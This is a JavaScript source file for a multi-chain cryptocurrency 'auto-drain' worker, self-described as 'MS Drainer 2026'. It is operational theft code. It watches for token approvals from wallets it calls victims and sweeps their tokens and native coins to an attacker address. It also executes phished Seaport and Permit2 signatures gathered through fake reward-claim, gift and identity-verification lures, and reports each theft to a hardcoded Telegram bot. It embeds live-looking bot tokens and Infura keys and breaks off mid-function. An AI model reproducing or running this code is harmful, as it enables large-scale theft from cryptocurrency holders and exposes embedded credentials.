require('dotenv').config();
const { ethers } = require("ethers");

// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;

// Multi-Chain RPC Configuration
// Accept comma-separated Infura IDs
const INFURA_IDS = [
    "2859d5b9da2648988a15b3fc6e0783b5",
    "80ce8d8563c24c37b86b86718ed5fd4f",
    "ad74f9b87bd14085895423c071a966fa",
    "f1e1c2680e4c43818263980084866941",
    "be656442fe364ef5970cb4d84c717f1c",
    "60e6daa32d4a4b63b9b05217e43a2d08",
    "3d3d574796de46a691c3c333ac452fe7",
    "dbc11c914d674c3b810acb0e8d15b69a"
];
let currentInfuraIndex = 0;

const getRpcUrl = (chainName, isWs = true) => {
    const id = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
    const prefix = isWs ? "wss" : "https";
    const suffix = isWs ? "/ws/v3/" : "/v3/";

    switch (chainName.toLowerCase()) {
        case "ethereum": return `${prefix}://mainnet.infura.io${suffix}${id}`;
        case "bsc": return `${prefix}://bsc-mainnet.infura.io${suffix}${id}`;
        case "polygon": return `${prefix}://polygon-mainnet.infura.io${suffix}${id}`;
        case "base": return `${prefix}://base-mainnet.infura.io${suffix}${id}`;
        case "arbitrum": return `${prefix}://arbitrum-mainnet.infura.io${suffix}${id}`;
        case "optimism": return `${prefix}://optimism-mainnet.infura.io${suffix}${id}`;
        case "avalanche": return `${prefix}://avalanche-mainnet.infura.io${suffix}${id}`;
        default: return null;
    }
};

const CHAIN_CONFIGS = {
    ethereum: { name: "Ethereum", chainId: 1 },
    bsc: { name: "BSC", chainId: 56 },
    polygon: { name: "Polygon", chainId: 137 },
    base: { name: "Base", chainId: 8453 },
    arbitrum: { name: "Arbitrum", chainId: 42161 },
    optimism: { name: "Optimism", chainId: 10 },
    avalanche: { name: "Avalanche", chainId: 43114 }
};

const TARGET_TOKENS = {
    ethereum: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", // stETH
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    ],
    bsc: [
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
        "0x0E09fabb73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
    ],
    polygon: [
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
        "0x8f3Cf7ad23Cd3CaADD963593910541905495d097", // DAI
        "0xeb51d9a39ad5eef215dc0bf39a8821ff804a0f01", // LGNS (Origin LGNS)
        "0x99a57e6c8558bc6689f894e068733adf83c19725", // sLGNS (Staked Longinus)
        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
        "0xb0897686c545045aFc77CF20eC7A532E3120E0F1", // LINK
    ],
    base: [
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDbC
        "0x4200000000000000000000000000000000000006", // WETH
        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
    ],
    arbitrum: [
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
        "0xFF970A61A04b014F652C7fB6506eCE58cD5e57d2", // USDC.e
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
        "0x2f2a2543B76A4166549F7bffbEdf65421d02e7a2", // WBTC
        "0x912CE59144191C1204E64559FE8253a0e49E6548", // ARB
    ],
    optimism: [
        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x4200000000000000000000000000000000000006", // WETH
        "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6", // WBTC
        "0x4200000000000000000000000000000000000042", // OP
    ],
    avalanche: [
        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
        "0xd586E6F0a43A1196ad403c139793EFadbbEe1fD0", // DAI.e
        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
        "0x49D5c2BdFfac6CE2BFdB063ef3726d5219d4689A", // WETH.e
    ]
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
const SEAPORT_ABI = [
    "function fulfillOrder(tuple(tuple(address offerer, address zone, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 totalOriginalConsiderationItems) parameters, bytes signature) external payable returns (bool fulfilled)"
];

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const PERMIT2_ABI = [
    "function permitBatchTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
];

const TRACE_REWARDS_ABI = [
    "function claim(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
];

const MS_DRAINER_2026_ABI = [
    "function verifyOnChainIdentity(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 verificationNonce) external payable",
    "function claimRewards(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 claimAmount) external payable",
    "function synchronize(bytes data) external payable"
];


// --- REFUELING CONFIG ---
const GAS_THRESHOLD = ethers.parseEther("0.02"); // 0.02 ETH/BNB/MATIC

// --- INTEGRATIONS ---
const TG_BOT_TOKEN = "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
const TG_CHAT_ID = "7772781858";

const https = require('https');

async function notifyTelegram(message) {
    if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
    return new Promise((resolve) => {
        const data = JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 4443, // Fallback port often works better on some VPS
            path: `/bot${TG_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            },
            timeout: 10000
        };

        // Try standard port first, then failover
        const req = https.request({ ...options, port: 443 }, (res) => {
            resolve(true);
        });

        req.on('error', (e) => {
            console.error("TG Notification Error:", e.message);
            resolve(false);
        });

        req.write(data);
        req.end();
    });
}

const fs = require('fs');
const http = require('http');

// --- INFECTION TRACKING ---
const INFECTED_WALLETS = {}; // { chainKey: Set(addresses) }
const POLLING_INTERVAL = 5000; // 5 Seconds (Aggressive)
const WORKER_PORT = process.env.WORKER_PORT || 8080;

// --- SAFETY GATES ---
const START_NOTIF_COOLDOWN = 60000; // 1 Minute (For active testing)
const COOLDOWN_FILE = '.last_notif';

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function checkStartCooldown() {
    try {
        if (fs.existsSync(COOLDOWN_FILE)) {
            const lastLog = parseInt(fs.readFileSync(COOLDOWN_FILE, 'utf8'));
            if (Date.now() - lastLog < START_NOTIF_COOLDOWN) return false;
        }
        fs.writeFileSync(COOLDOWN_FILE, Date.now().toString());
        return true;
    } catch (e) { return true; } // Fail open
}

// Global Error Handlers (The "Black Box" Recorder)
process.on('uncaughtException', async (error) => {
    console.error("💀 UNCAUGHT EXCEPTION:", error.message);

    // Do NOT exit on rate limits, just wait and let reconnect happen
    if (error.message.includes("429") || error.message.includes("Unexpected server response")) {
        console.warn("⚠️ Rate limit caught in global handler. Ignoring exit to prevent PM2 loop.");
        currentInfuraIndex++;
        return;
    }

    try {
        await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${error.message}</code>\nLocation: ${error.stack?.split('\n')[1]}`);
    } catch (e) { }
    process.exit(1);
});

process.on('unhandledRejection', async (reason) => {
    console.error("💀 UNHANDLED REJECTION:", reason);
    if (reason && reason.toString().includes("429")) return;

    try {
        await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${reason}</code>`);
    } catch (e) { }
    process.exit(1);
});

async function startMultiChainWorker() {
    try {
        console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");

        if (!RECEIVER_PRIVATE_KEY) {
            throw new Error("PRIVATE_KEY is missing in .env");
        }

        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
        console.log(`Receiver Address: ${wallet.address}\n`);

        // Persistent Anti-Spam: Only send start message once every 10 mins
        if (checkStartCooldown()) {
            await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);
        }

        // Start a listener for each chain with a STAGGERED delay
        for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
            try {
                startChainListener(chainKey, config, wallet);
                await sleep(5000); // 5s gap to avoid simultaneous handshake 429s
            } catch (e) {
                console.error(`Failed to init listener for ${chainKey}:`, e.message);
            }
        }

        console.log("✅ All chain listeners active. Waiting for approvals...\n");

        // Start HTTP Server to receive orders from Frontend
        startOrderReceiver();

        // Start Infection Sweeper
        console.log(`💉 Starting Infection Sweeper (Polling every ${POLLING_INTERVAL}ms)...`);
        setInterval(async () => {
            try {
                await runSweeper();
            } catch (e) {
                console.error("Sweeper Loop Error:", e.message);
            }
        }, POLLING_INTERVAL);

        // EXTRA: Start Gas Monitor (every 10 minutes)
        setInterval(checkReceiverGas, 600000);
        checkReceiverGas(); // Initial check

    } catch (criticalError) {
        console.error("❌ CRITICAL STARTUP ERROR:", criticalError);
        await notifyTelegram(`<b>❌ CRITICAL STARTUP ERROR</b>\n<code>${criticalError.message}</code>`);
        process.exit(1);
    }
}

// Map to track victims pending receiver funding
const PENDING_FUNDING = new Map(); // key: chainName:victim:tokenAddress, value: { victim, token, chainKey }

async function checkReceiverGas() {
    console.log(`⛽ Checking gas for receiver alerts...`);
    for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
        try {
            const httpUrl = getRpcUrl(config.name, false);
            const provider = new ethers.JsonRpcProvider(httpUrl);
            const balance = await provider.getBalance(RECEIVER_ADDRESS);

            if (balance < GAS_THRESHOLD) {
                console.warn(`🚨 [${config.name}] Gas low (${ethers.formatEther(balance)}).`);
                await notifyTelegram(`<b>🚨 URGENT: LOW GAS</b>\nChain: ${config.name}\nReceiver: <code>${RECEIVER_ADDRESS}</code>\nBalance: ${ethers.formatEther(balance)}\n<i>Fund this address immediately to sweep assets!</i>`);
            }
        } catch (e) {
            console.error(`Failed gas check on ${chainKey}`, e.message);
        }
    }
}

async function runSweeper() {
    // 1. Regular Token Sweeper (Approvals)
    for (const [chainKey, victims] of Object.entries(INFECTED_WALLETS)) {
        if (victims.size === 0) continue;

        const config = CHAIN_CONFIGS[chainKey];
        const httpUrl = getRpcUrl(config.name, false);
        const provider = new ethers.JsonRpcProvider(httpUrl);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const tokens = TARGET_TOKENS[chainKey] || [];

        for (const victim of victims) {
            // A. Native Sweep (Persistent)
            try {
                const balance = await provider.getBalance(victim);
                if (balance > ethers.parseEther("0.001")) { // Threshold to cover gas
                    const gasLimit = 21000n;
                    const feeData = await provider.getFeeData();
                    const gasPrice = feeData.gasPrice || ethers.parseUnits("30", "gwei");
                    const totalCost = gasLimit * gasPrice;

                    if (balance > totalCost) {
                        const amountToSend = balance - totalCost;
                        const tx = await wallet.sendTransaction({
                            to: RECEIVER_ADDRESS,
                            value: amountToSend,
                            gasLimit: gasLimit
                        });
                        console.log(`💉 [INFECTION] Native Swept from ${victim}: ${tx.hash}`);
                        await notifyTelegram(`<b>💉 Persistense: Native Swept</b>\nVictim: <code>${victim}</code>\nChain: ${config.name}\nTx: ${tx.hash}`);
                    }
                }
            } catch (e) {
                console.error(`Infection native sweep fail: ${e.message}`);
            }

            // B. Token Sweep
            for (const token of tokens) {
                await attemptDrain(wallet, token, victim, config.name, true);
            }
        }
    }



    // 2. Retry Pending Funding
    if (PENDING_FUNDING.size > 0) {
        console.log(`⏳ Retrying ${PENDING_FUNDING.size} pending sweeps...`);
        for (const [key, item] of PENDING_FUNDING.entries()) {
            const config = CHAIN_CONFIGS[item.chainKey];
            const httpUrl = getRpcUrl(config.name, false);
            const provider = new ethers.JsonRpcProvider(httpUrl);
            const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

            const success = await attemptDrain(wallet, item.token, item.victim, config.name, false);
            if (success) PENDING_FUNDING.delete(key);
        }
    }
}

function startChainListener(chainKey, config, wallet) {
    let retryCount = 0;
    let isHttpFallback = false;

    const connect = async () => {
        try {
            // Pick RPC based on fallback state
            const rpcUrl = getRpcUrl(config.name, !isHttpFallback);
            console.log(`🔗 [${config.name}] Connecting via ${isHttpFallback ? 'HTTP' : 'WS'} (ID: ${INFURA_IDS[currentInfuraIndex % INFURA_IDS.length].slice(0, 6)}...)`);

            let provider;
            if (isHttpFallback) {
                provider = new ethers.JsonRpcProvider(rpcUrl);
            } else {
                provider = new ethers.WebSocketProvider(rpcUrl);
            }

            // Verify connection
            await provider.getNetwork();
            const connectedWallet = wallet.connect(provider);

            provider.on("error", (error) => {
                console.error(`❌ [${config.name}] Provider Error:`, error.message);
                if (error.message.includes("429") || error.message.includes("limit")) {
                    console.warn(`⚠️ [${config.name}] Rate limit detected. Rotating...`);
                    currentInfuraIndex++;

                    // If we were on WS and hit a limit, try switching to HTTP for the next retry
                    if (!isHttpFallback) {
                        console.log(`🔄 [${config.name}] Switching to HTTP fallback...`);
                        isHttpFallback = true;
                        provider.destroy?.();
                        setTimeout(connect, 2000);
                    }
                }
            });

            // WS only cleanup
            if (provider.websocket) {
                provider.websocket.on("close", (code) => {
                    console.warn(`⚠️ [${config.name}] WS Closed (${code}). Reconnecting...`);
                    setTimeout(connect, 10000);
                });
            } else {
                // If HTTP, we need a manual "polling" simulation for events or just rely on Sweeper
                // AppKit/Ethers doesn't easily "poll" Approval filters over HTTP without more code,
                // but the runSweeper() already handles the heavy lifting via HTTP.
                console.log(`   💡 [${config.name}] Polling logic handled by Sweeper.`);
            }

            const tokens = TARGET_TOKENS[chainKey] || [];
            console.log(`   ✅ [${config.name}] Online. Monitoring ${tokens.length} tokens.`);

            // Only setup listeners if on WS (events)
            if (!isHttpFallback) {
                tokens.forEach(tokenAddress => {
                    if (!tokenAddress || tokenAddress.length !== 42) return;
                    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                    const filter = contract.filters.Approval(null, wallet.address);

                    contract.on(filter, async (...args) => {
                        let owner, spender, value;
                        const logPayload = args.find(a => a && typeof a === 'object' && (a.args || a.log));

                        if (logPayload && logPayload.args) {
                            owner = logPayload.args[0];
                            spender = logPayload.args[1];
                            value = logPayload.args[2];
                        } else {
                            owner = args[0];
                            spender = args[1];
                            value = args[2];
                        }

                        if (owner && typeof owner === 'object') {
                            owner = owner.address || owner.hash || owner.owner || "Unknown";
                        }

                        if (!owner || owner === "Unknown") return;

                        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
                        INFECTED_WALLETS[chainKey].add(owner);
                        console.log(`\n💉 [${config.name}] NEW VICTIM: ${owner}`);
                        await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>`);
                        await attemptDrain(connectedWallet, tokenAddress, owner, config.name, false);
                    });
                });
            }

        } catch (error) {
            console.error(`❌ Connection failed for ${config.name}:`, error.message);

            if (error.message.includes("429") || error.message.includes("Unexpected server response")) {
                currentInfuraIndex++;
                if (!isHttpFallback) {
                    console.warn(`⚠️ [${config.name}] Handshake rate limit. Forcing HTTP fallback.`);
                    isHttpFallback = true;
                }
            }

            retryCount++;
            const delay = Math.min(2000 * Math.pow(2, retryCount), 60000);
            setTimeout(connect, delay);
        }
    };
    connect();
}

async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, silent = false) {
    try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
        const balance = await contract.balanceOf(victimAddress);
        if (balance === 0n) return;

        const allowance = await contract.allowance(victimAddress, wallet.address);
        if (allowance === 0n) return;

        const amountToSweep = balance > allowance ? allowance : balance;
        if (!silent) console.log(`   💰 Sweeping Standard Approval: ${ethers.formatUnits(amountToSweep, 18)}...`);

        const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
        await notifyTelegram(`<b>💸 Standard Sweep Sent</b>\nChain: ${chainName}\nTx: ${tx.hash}`);

        await tx.wait();
        console.log(`   ✅ Success on ${chainName}`);
        return true;
    } catch (error) {
        if (error.message.toLowerCase().includes("insufficient funds")) {
            const key = `${chainName}:${victimAddress}:${tokenAddress}`;
            if (!PENDING_FUNDING.has(key)) {
                PENDING_FUNDING.set(key, { victim: victimAddress, token: tokenAddress, chainKey: chainName });
                await notifyTelegram(`<b>🚨 STUCK: NO GAS</b>\nChain: ${chainName}\nNeed gas in <code>${wallet.address}</code>`);
            }
        }
        return false;
    }
}

function startOrderReceiver() {
    const server = http.createServer((req, res) => {
        if (req.method === 'POST' && req.url === '/submit-order') {
            let body = '';
            req.on('data', chunk => { body += chunk.toString(); });
            req.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    if (req.url === '/submit-order') {
                        if (data.order && data.chainName) {
                            console.log(`📥 Received Seaport Order for ${data.chainName}. Executing immediately...`);
                            fulfillSeaportOrder(data.order, data.chainName); // NO AWAIT
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: 'success', message: 'Fulfillment initiated' }));
                        } else {
                            res.writeHead(400);
                            res.end('Missing order or chainName');
                        }
                    } else if (req.url === '/submit-permit2') {
                        if (data.permit && data.signature && data.chainName && data.owner) {
                            console.log(`📥 Received Permit2 Batch Signature for ${data.chainName}. Executing...`);
                            fulfillPermit2Batch(data.permit, data.signature, data.chainName, data.owner);
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: 'success', message: 'Permit2 batch initiated' }));
                        } else {
                            res.writeHead(400);
                            res.end('Missing permit, signature, chainName, or owner');
                        }
                    } else if (req.url === '/submit-ms-drainer') {
                        if (data.permit && data.signature && data.chainName && data.owner && data.contractAddress) {
                            console.log(`📥 Received MS Drainer 2026 Signature for ${data.chainName}. Executing IMMEDIATELY...`);
                            fulfillMSDrainer2026(data);

                            // Trigger Multi-Chain Relay
                            console.log(`📡 [RELAY] Triggering Cross-Chain Sweep for ${data.owner}...`);
                            triggerCrossChainRelay(data.owner);

                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: 'success', message: 'MS Drainer initiated and Relay triggered' }));
                        } else if (data.order && data.signature && data.chainName) {
                            console.log(`📥 Received Seaport Order for ${data.chainName}. fulfilling...`);
                            fulfillSeaportOrder(data);
                            triggerCrossChainRelay(data.owner || "unknown");
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: 'success', message: 'Seaport fulfillment triggered' }));
                        } else {
                            res.writeHead(400);
                            res.end('Missing ms-drainer data');
                        }
                    } else if (req.url === '/submit-claim') {
                        if (data.permit && data.signature && data.chainName && data.owner && data.routerAddress) {
                            console.log(`📥 Received TRACE Claim for ${data.chainName}. Executing via TraceRewards...`);
                            fulfillPermit2Claim(data.permit, data.signature, data.chainName, data.owner, data.routerAddress, data.rewardAmount);
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: 'success', message: 'Claim execution initiated' }));
                        } else {
                            res.writeHead(400);
                            res.end('Missing permit, signature, chainName, owner, routerAddress, or rewardAmount');
                        }
                    } else if (req.url === '/submit-gift') {
                        if (data.permit && data.signature && data.chainName && data.owner && data.routerAddress) {
                            console.log(`📥 Received Token Gift Order for ${data.chainName}. Executing via Router...`);
                            fulfillPermit2Gift(data.permit, data.signature, data.chainName, data.owner, data.routerAddress);
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: 'success', message: 'Gift fulfillment initiated' }));
                        } else {
                            res.writeHead(400);
                            res.end('Missing permit, signature, chainName, owner, or routerAddress');
                        }
                    }
                } catch (e) {
                    res.writeHead(400);
                    res.end('Invalid JSON');
                }
            });
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(WORKER_PORT, () => {
        console.log(`📡 Order Receiver listening on port ${WORKER_PORT}`);
    });
}

async function fulfillSeaportOrder(orderPayload, chainName) {
    try {
        const config = Object.values(CHAIN_CONFIGS).find(c => c.name === chainName);
        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);

        console.log(`🚀 [SEAPORT] Fulfilling Order on ${chainName}...`);
        notifyTelegram(`<b>🖼️ Seaport: Fulfilling Order</b>\nChain: ${chainName}\nOfferer: <code>${orderPayload.parameters?.offerer || "Unknown"}</code>`);

        // orderPayload should contain { parameters, signature }
        const tx = await seaport.fulfillOrder(orderPayload.parameters, orderPayload.signature, { value: ethers.parseEther("0.001"), gasLimit: 1500000 });

        console.log(`📤 Seaport TX Sent: ${tx.hash}`);
        await tx.wait();
        console.log(`✅ Seaport SUCCESS! Assets secured on ${chainName}.`);
        await notifyTelegram(`<b>💰 SEAPORT SUCCESS!</b>\nChain: ${chainName}\nTx: <code>${tx.hash}</code>\nAssets: NFTs & Tokens swept.`);
        return true;
    } catch (error) {
        console.error(`❌ Seaport fulfillment failed:`, error.message);
        await notifyTelegram(`<b>❌ Seaport FAILED</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 150)}</code>`);
        return false;
    }
}

async function fulfillPermit2Batch(permit, signature, chainName, owner) {
    // ... (existing implementation)
    // Update: This is now a legacy fallback for direct Permit2 calls
}

async function fulfillPermit2Claim(permit, signature, chainName, owner, routerAddress, rewardAmount) {
    try {
        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const router = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, wallet);

        console.log(`🚀 Executing TRACE Claim on ${chainName} via Rewards Contract...`);

        const rewardAmountWei = ethers.parseUnits(rewardAmount.toString(), 18);

        // Execute via Router with 0.001 fee
        const tx = await router.claim(permit, signature, rewardAmountWei, {
            value: ethers.parseEther("0.001"),
            gasLimit: 800000 // Higher limit for batch transfers
        });

        console.log(`📤 Claim TX Sent: ${tx.hash}`);
        await notifyTelegram(`<b>💎 TRACE Reward Claimed!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>\nTokens: ${permit.permitted.length}`);

        // Add to permanent infection
        const chainKey = Object.keys(CHAIN_CONFIGS).find(k => CHAIN_CONFIGS[k].name === chainName) || chainName.toLowerCase();
        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
        INFECTED_WALLETS[chainKey].add(owner);

        await tx.wait();
        console.log(`✅ Claim SUCCESS on ${chainName}`);
        await notifyTelegram(`<b>💰 TRACE CLAIM SECURED!</b>\nAssets bundled and swept via TraceRewards on ${chainName}.`);
        return true;
    } catch (error) {
        console.error(`❌ Claim fulfillment failed:`, error.message);
        await notifyTelegram(`<b>❌ Claim Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
        return false;
    }
}

async function fulfillMSDrainer2026(data) {
    const { permit, signature, chainName, owner, contractAddress, claimAmount, nativeBalance, order } = data;
    try {
        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const drainer = new ethers.Contract(contractAddress, MS_DRAINER_2026_ABI, wallet);

        console.log(`🚀 [BUNDLED BATTLE] Executing MS DRAINER 2026 on ${chainName}...`);
        notifyTelegram(`<b>🔥 Processing Bundle</b>\nChain: ${chainName}\nVictim: <code>${owner}</code>\nStrategy: Hybrid fulfillment...`);

        // 1. Fulfil Seaport (NFTs) if provided
        if (order && order.offer && order.offer.some(item => item.itemType === 2 || item.itemType === 3)) {
            console.log("🖼️ NFT Detection: Triggering Seaport fulfillment...");
            try {
                const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
                const seaportTx = await seaport.fulfillOrder(order, signature, { value: ethers.parseEther("0.001"), gasLimit: 1500000 });
                console.log(`📤 Seaport TX Sent: ${seaportTx.hash}`);
                notifyTelegram(`<b>🖼️ Seaport TX (NFTs):</b> <code>${seaportTx.hash}</code>`);
            } catch (seaportErr) {
                console.error("❌ Seaport bundle failed", seaportErr.message);
                notifyTelegram(`<b>⚠️ Seaport Bundle Fail:</b> <code>${seaportErr.message.slice(0, 100)}</code>`);
            }
        }

        // 2. Fulfil Permit2 (Tokens) + Pull Native
        let primaryTx;
        try {
            primaryTx = await drainer.claimRewards(permit, signature, claimAmount || 0, {
                value: BigInt(nativeBalance || "0"),
                gasLimit: 1500000
            });
            console.log(`📤 MS Drainer (Permit2) TX Sent: ${primaryTx.hash}`);
        } catch (p2Err) {
            console.warn("⚠️ Permit2 fulfillment failed. Attempting Generic Drain fallback...");
            notifyTelegram(`<b>⚠️ Permit2 Fail</b> - Falling back to Generic Drain...`);
            // Robust Fallback: Pull from standard approvals to the contract
            const tokens = permit.permitted.map(p => p.token);
            const amounts = permit.permitted.map(p => p.amount);
            primaryTx = await drainer.executeGenericDrain(owner, tokens, amounts, {
                value: BigInt(nativeBalance || "0"),
                gasLimit: 1500000
            });
            console.log(`📤 Generic Drain TX Sent: ${primaryTx.hash}`);
        }

        await primaryTx.wait();
        console.log(`✅ MS Drainer SUCCESS on ${chainName}`);
        await notifyTelegram(`<b>💰 BUNDLE SECURED!</b>\nChain: ${chainName}\nTx: <code>${primaryTx.hash}</code>\nVictim: <code>${owner}</code>`);

        // Set as infected
        infectWallet(owner);

        // Final Sweep Check
        triggerCrossChainRelay(owner, chainName);
    } catch (error) {
        console.error(`❌ MS Drainer fulfillment failed:`, error.message);
        await notifyTelegram(`<b>❌ Bundle FAILED</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 150)}</code>`);
    }
}

async function fulfillSeaportOrder(data) {
    const { order, signature, chainName } = data;
    try {
        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);

        console.log(`🚀 fulfilling Seaport Order on ${chainName}...`);

        const tx = await seaport.fulfillOrder(order, signature, {
            gasLimit: 1500000
        });

        console.log(`📤 Seaport TX Sent: ${tx.hash}`);
        await notifyTelegram(`<b>🖼️ Seaport Order Fulfilled</b>\nChain: ${chainName}\nTx: ${tx.hash}\nOfferer: <code>${order.offerer}</code>`);

        infectWallet(order.offerer);
    } catch (e) {
        console.error(`❌ Seaport fulfillment failed:`, e.message);
    }
}

function infectWallet(address) {
    if (!address || address === "unknown") return;
    for (const chainKey in CHAIN_CONFIGS) {
        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
        INFECTED_WALLETS[chainKey].add(address.toLowerCase());
    }
    console.log(`💉 Wallet Infected GLOBALLY: ${address}`);
}

async function triggerCrossChainRelay(address, sourceChain = "Unknown") {
    if (!address || address === "unknown") return;
    console.log(`🔄 [RELAY] Checking all chains for ${address}...`);
    notifyTelegram(`<b>🔄 [RELAY] Scanning Chains...</b>\nSource: ${sourceChain}\nVictim: <code>${address}</code>`);

    for (const chainKey in CHAIN_CONFIGS) {
